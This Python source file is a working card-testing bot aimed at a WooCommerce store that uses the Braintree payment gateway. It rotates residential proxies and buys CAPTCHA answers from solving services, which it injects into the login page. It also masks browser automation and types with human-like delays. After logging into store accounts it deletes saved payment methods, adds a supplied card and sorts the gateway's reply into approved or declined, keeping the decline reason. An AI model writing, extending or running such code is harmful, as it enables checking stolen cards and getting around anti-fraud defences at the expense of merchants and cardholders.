import os
import sys
import json
import time
import secrets
import requests
from playwright.sync_api import sync_playwright


def env(name, default=None, required=False):
    value = os.environ.get(name, default)
    if required and not value:
        print(json.dumps({"status": "CONFIG_ERROR", "message": "missing env " + name}))
        sys.exit(2)
    return value


def capsolver_turnstile(client_key, page_url, sitekey, proxy_url):
    payload = {
        "clientKey": client_key,
        "task": {
            "type": "AntiTurnstileTask",
            "websiteURL": page_url,
            "websiteKey": sitekey,
            "proxy": proxy_url,
        },
    }
    try:
        resp = requests.post("https://api.capsolver.com/createTask", json=payload, timeout=30).json()
    except Exception:
        return ""
    if resp.get("errorId") not in (None, 0, False):
        return ""
    task_id = resp.get("taskId", "")
    if not task_id:
        return ""
    for _ in range(30):
        try:
            result = requests.post("https://api.capsolver.com/getTaskResult", json={"clientKey": client_key, "taskId": task_id}, timeout=20).json()
        except Exception:
            time.sleep(4)
            continue
        if result.get("status") == "ready":
            return result.get("solution", {}).get("token", "")
        if result.get("status") == "failed":
            return ""
        time.sleep(4)
    return ""


def anticaptcha_v3(client_key, page_url, sitekey, action):
    payload = {
        "clientKey": client_key,
        "task": {
            "type": "RecaptchaV3TaskProxyless",
            "websiteURL": page_url,
            "websiteKey": sitekey,
            "pageAction": action,
            "minScore": 0.9,
        },
    }
    try:
        resp = requests.post("https://api.anti-captcha.com/createTask", json=payload, timeout=30).json()
    except Exception:
        return ""
    if resp.get("errorId") not in (None, 0):
        return ""
    task_id = resp.get("taskId", 0)
    if not task_id:
        return ""
    for _ in range(40):
        try:
            result = requests.post("https://api.anti-captcha.com/getTaskResult", json={"clientKey": client_key, "taskId": task_id}, timeout=20).json()
        except Exception:
            time.sleep(5)
            continue
        if result.get("status") == "ready":
            return result.get("solution", {}).get("gRecaptchaResponse", "")
        if result.get("status") == "failed":
            return ""
        time.sleep(5)
    return ""


def twocaptcha_v3(client_key, page_url, sitekey, action):
    payload = {
        "clientKey": client_key,
        "task": {
            "type": "RecaptchaV3TaskProxyless",
            "websiteURL": page_url,
            "websiteKey": sitekey,
            "pageAction": action,
            "minScore": 0.9,
        },
    }
    try:
        resp = requests.post("https://api.2captcha.com/createTask", json=payload, timeout=30).json()
    except Exception:
        return ""
    if resp.get("errorId") not in (None, 0):
        return ""
    task_id = resp.get("taskId", 0)
    if not task_id:
        return ""
    for _ in range(40):
        try:
            result = requests.post("https://api.2captcha.com/getTaskResult", json={"clientKey": client_key, "taskId": task_id}, timeout=20).json()
        except Exception:
            time.sleep(5)
            continue
        if result.get("status") == "ready":
            return result.get("solution", {}).get("gRecaptchaResponse", "")
        if result.get("status") == "failed":
            return ""
        time.sleep(5)
    return ""


def solve_v3(cfg):
    if cfg["v3_solver"] == "2captcha":
        return twocaptcha_v3(cfg["twocaptcha_key"], cfg["login_url"], cfg["v3_sitekey"], cfg["v3_action"])
    return anticaptcha_v3(cfg["anticaptcha_key"], cfg["login_url"], cfg["v3_sitekey"], cfg["v3_action"])


def load_accounts(path, single_user, single_pass):
    # Skill atenea-gateway: el padre (tns_braintree) ya hace round-robin y pasa
    # 1 sola cuenta via LOGIN_USER/PASS -> esa tiene prioridad para no quemar
    # captchas/sesiones de todas las cuentas en cada check.
    if single_user and single_pass:
        return [(single_user.strip(), single_pass.strip())]
    accounts = []
    if path:
        with open(path, "r", encoding="utf-8") as handle:
            for line in handle:
                line = line.strip()
                if not line:
                    continue
                user, _, password = line.partition("|")
                user = user.strip()
                password = password.strip()
                if user and password:
                    accounts.append((user, password))
    return accounts


def delete_existing_methods(page):
    deleted = 0
    for _ in range(5):
        link = page.query_selector('a[href*="delete-payment-method"]')
        if not link:
            break
        try:
            with page.expect_navigation(wait_until="domcontentloaded", timeout=30000):
                link.click()
        except Exception:
            pass
        page.wait_for_timeout(4000)
        deleted += 1
    return deleted


def run_account(playwright, cfg, login_user, login_pass):
    session = secrets.token_hex(4)
    proxy_password = cfg["iproyal_pass"] + "_country-" + cfg["iproyal_country"] + "_session-" + session + "_lifetime-" + cfg["iproyal_lifetime"] + "_streaming-1"
    proxy_url = "http://" + cfg["iproyal_user"] + ":" + proxy_password + "@" + cfg["iproyal_host"]
    proxy_cfg = {"server": "http://" + cfg["iproyal_host"], "username": cfg["iproyal_user"], "password": proxy_password}
    outcome = {"account": login_user, "session": session}
    try:
        check = requests.get("https://api.ipify.org", proxies={"http": proxy_url, "https": proxy_url}, timeout=25)
        outcome["exit_ip"] = check.text.strip()
    except Exception as exc:
        outcome["status"] = "PROXY_ERROR"
        outcome["message"] = str(exc)[:200]
        return outcome
    turnstile_token = capsolver_turnstile(cfg["capsolver_key"], cfg["login_url"], cfg["ts_sitekey"], proxy_url)
    v3_token = solve_v3(cfg)
    if not turnstile_token or not v3_token:
        outcome["status"] = "SOLVER_ERROR"
        outcome["message"] = "empty token"
        return outcome
    browser = playwright.chromium.launch(headless=cfg["headless"], proxy=proxy_cfg, args=["--disable-blink-features=AutomationControlled"])
    try:
        context = browser.new_context(user_agent=cfg["user_agent"], locale="en-US", viewport={"width": 1366, "height": 900})
        page = context.new_page()
        page.goto(cfg["login_url"], wait_until="domcontentloaded", timeout=90000)
        page.wait_for_timeout(5000)
        page.click("#username", timeout=15000)
        for char in login_user:
            page.type("#username", char, delay=90)
        page.wait_for_timeout(400)
        page.click("#password")
        for char in login_pass:
            page.type("#password", char, delay=110)
        page.wait_for_timeout(800)
        page.evaluate(
            """([tsToken, v3Token]) => {
              [...document.querySelectorAll('input[name="cf-turnstile-response"]')].forEach(el => {
                el.value = tsToken;
                el.dispatchEvent(new Event('input', {bubbles: true}));
                el.dispatchEvent(new Event('change', {bubbles: true}));
              });
              try { if (window.turnstileWooLoginCallback) turnstileWooLoginCallback(tsToken); } catch (e) {}
              const now = Date.now();
              [...document.querySelectorAll('.agr-recaptcha-response')].forEach(el => {
                el.value = v3Token;
                el.setAttribute('data-token-time', now);
              });
            }""",
            [turnstile_token, v3_token],
        )
        page.wait_for_timeout(1200)
        login_button = page.query_selector('button[name="login"]')
        try:
            with page.expect_navigation(wait_until="domcontentloaded", timeout=30000):
                if login_button:
                    login_button.click()
                else:
                    page.keyboard.press("Enter")
        except Exception:
            pass
        page.wait_for_timeout(6000)
        authenticated = page.evaluate("() => !!document.querySelector('.woocommerce-MyAccount-navigation-link--customer-logout, a[href*=\"customer-logout\"]')")
        outcome["url"] = page.url
        if not authenticated:
            try:
                outcome["message"] = page.inner_text("body", timeout=5000)[:300]
            except Exception:
                outcome["message"] = ""
            outcome["status"] = "LOGIN_FAILED"
            return outcome
        outcome["deleted"] = delete_existing_methods(page)
        if cfg["delete_only"]:
            outcome["status"] = "DELETED" if outcome["deleted"] > 0 else "NO_METHOD"
            return outcome
        page.goto(cfg["addpm_url"], wait_until="domcontentloaded", timeout=90000)
        page.wait_for_timeout(8000)
        number_frame = page.frame(name="braintree-hosted-field-number")
        exp_frame = page.frame(name="braintree-hosted-field-expirationDate")
        postal_frame = page.frame(name="braintree-hosted-field-postalCode")
        if not number_frame or not exp_frame or not postal_frame:
            outcome["status"] = "FIELDS_MISSING"
            outcome["message"] = "braintree iframes not found"
            outcome["url"] = page.url
            return outcome
        number_frame.click("input", timeout=20000)
        page.wait_for_timeout(400)
        for char in cfg["pan"]:
            number_frame.type("input", char, delay=110)
        page.wait_for_timeout(500)
        exp_frame.click("input", timeout=15000)
        page.wait_for_timeout(300)
        for char in cfg["exp_mm"] + "/" + cfg["exp_yy"]:
            exp_frame.type("input", char, delay=110)
        page.wait_for_timeout(500)
        postal_frame.click("input", timeout=15000)
        page.wait_for_timeout(300)
        for char in cfg["postal"]:
            postal_frame.type("input", char, delay=110)
        page.wait_for_timeout(7000)
        submit_button = page.query_selector("#place_order")
        try:
            with page.expect_navigation(wait_until="domcontentloaded", timeout=60000):
                if submit_button:
                    submit_button.click()
                else:
                    page.keyboard.press("Enter")
        except Exception:
            pass
        page.wait_for_timeout(10000)
        outcome["url"] = page.url
        outcome["status"] = "UNKNOWN"
        try:
            notices = page.inner_text(".woocommerce-notices-wrapper", timeout=5000)
            outcome["notices"] = notices[:500]
        except Exception:
            notices = ""
        try:
            body_text = page.inner_text("body", timeout=5000)
            outcome["body"] = body_text[:500]
        except Exception:
            body_text = ""
        combined = (notices + " " + body_text).lower()
        if "successfully added" in combined or "has been added" in combined:
            outcome["status"] = "APPROVED"
        elif any(k in combined for k in ("error saving your payment method", "declined",
                                         "do not honour", "do not honor", "invalid",
                                         "expired card", "gateway rejected", "risk_threshold",
                                         "processor", "duplicate", "fraud",
                                         "three_d_secure", "token_issuance")):
            outcome["status"] = "DECLINED"
            # Skill atenea-gateway: juntar TODAS las lineas error/reason (Woo parte
            # "There was an error..." y "Reason: Gateway Rejected: ..." en 2 lineas).
            # Antes tomaba solo la primera y se perdia el subcodigo.
            hits: list[str] = []
            for line in (notices + "\n" + body_text).splitlines():
                ll = line.strip()
                if not ll:
                    continue
                low = ll.lower()
                if ("reason" in low or "error" in low or "gateway rejected" in low
                        or "risk_threshold" in low or "declined" in low
                        or "invalid" in low or "duplicate" in low or "fraud" in low):
                    if ll not in hits:
                        hits.append(ll)
            if hits:
                outcome["reason"] = " ".join(hits)[:300]
        elif notices.strip():
            outcome["status"] = "DECLINED"
        return outcome
    finally:
        browser.close()


def main():
    cfg = {
        "iproyal_user": env("IPROYAL_USER", required=True),
        "iproyal_pass": env("IPROYAL_PASS", required=True),
        "iproyal_host": env("IPROYAL_HOST", required=True),
        "iproyal_country": env("IPROYAL_COUNTRY", "us"),
        "iproyal_lifetime": env("IPROYAL_LIFETIME", "10m"),
        "capsolver_key": env("CAPSOLVER_API_KEY", required=True),
        "anticaptcha_key": env("ANTICAPTCHA_API_KEY", required=True),
        "twocaptcha_key": env("TWO_CAPTCHA_API_KEY", ""),
        "v3_solver": env("V3_SOLVER", "anticaptcha"),
        "login_url": env("LOGIN_URL", required=True),
        "addpm_url": env("ADDPM_URL", required=True),
        "ts_sitekey": env("TS_SITEKEY", required=True),
        "v3_sitekey": env("V3_SITEKEY", required=True),
        "v3_action": env("V3_ACTION", "submit"),
        "headless": env("HEADLESS", "1") == "1",
        "delete_only": env("DELETE_ONLY", "0") == "1",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    card_raw = env("CARD", required=env("DELETE_ONLY", "0") != "1")
    if card_raw:
        parts = card_raw.split("|")
        cfg["pan"] = parts[0].strip()
        cfg["exp_mm"] = parts[1].strip().zfill(2)
        exp_yy = parts[2].strip()
        if len(exp_yy) == 4:
            exp_yy = exp_yy[2:]
        cfg["exp_yy"] = exp_yy
        cfg["postal"] = parts[-1].strip()
    else:
        cfg["pan"] = ""
        cfg["exp_mm"] = ""
        cfg["exp_yy"] = ""
        cfg["postal"] = ""

    accounts = load_accounts(env("ACCOUNTS_FILE"), env("LOGIN_USER"), env("LOGIN_PASS"))
    if not accounts:
        print(json.dumps({"status": "CONFIG_ERROR", "message": "no accounts: set ACCOUNTS_FILE or LOGIN_USER/LOGIN_PASS"}))
        sys.exit(2)

    results = []
    with sync_playwright() as playwright:
        for login_user, login_pass in accounts:
            try:
                outcome = run_account(playwright, cfg, login_user, login_pass)
            except Exception as exc:
                outcome = {"account": login_user, "status": "ERROR", "message": str(exc)[:300]}
            results.append(outcome)
            print(json.dumps(outcome))
    sys.exit(0 if any(item.get("status") in ("APPROVED", "DELETED") for item in results) else 1)


if __name__ == "__main__":
    main()
